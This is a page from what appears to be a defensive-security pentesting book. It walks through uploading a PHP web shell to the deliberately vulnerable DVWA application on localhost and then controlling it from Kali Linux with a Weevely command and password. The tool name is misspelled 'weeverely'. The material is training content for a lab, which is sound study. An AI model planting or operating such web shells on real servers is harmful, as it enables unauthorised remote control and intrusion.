426 Leveraging Pentesting for Defensive Security

Now, let's go back to DVWA to upload our shell.

To do that, just go to **File Upload** in the left menu, then click on **Browse**, locate myshell.php, and click on **Upload.**

Now, we need to copy the location of the file on the server. To do that, just copy the first part of the URL (`http://127.0.0.1/DVWA`) and the path highlighted in the successfully uploaded message (`/hackable/uploads/myshell.php`), as shown in the following figure:

![](bbox=[0.137, 0.266, 0.862, 0.535])

Now, the path should look like this:

```
http://127.0.0.1/DVWA/hackable/uploads/myshell.php
```

Now, let's again open the console of Kali Linux to execute the shell with the following command (notice that we, are basically adding the path to the server plus the password to run the shell):

```
weeverely http://127.0.0.1/DVWA/hackable/uploads/myshell.php
mypassword
```

Figure 15.24 – Path of the shell on DVWA